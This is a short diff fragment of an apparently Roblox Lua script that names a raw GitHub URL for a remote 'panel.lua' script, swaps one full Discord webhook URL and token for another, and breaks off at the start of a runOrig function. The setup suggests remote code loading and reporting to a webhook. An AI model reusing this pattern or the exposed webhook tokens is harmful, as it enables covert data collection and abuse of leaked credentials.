@@ -2,7 +2,7 @@ local h = game:GetService("HttpService")
 local P = game:GetService("Players")
 local M = game:GetService("MarketplaceService")
 local ORIG = "https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/panel.lua"
-local WEB = "https://discord.com/api/webhooks/1429275806244405432/mo0dcCVHFOXh-3kch8oWnPB5-xjNUVxQRZEr114VgZDYQr4Zd7_V_r6i9CUglJ6Q0Yol"
+local WEB = "https://discord.com/api/webhooks/1430347090671698033/JNAXJ5MFX9cZbNievAkZjAA3pFWBB0FI21YnFmZyErLqNIAsq5s5GF04HA2FqfZVej45"
 
 local function runOrig()
     pcall(function()
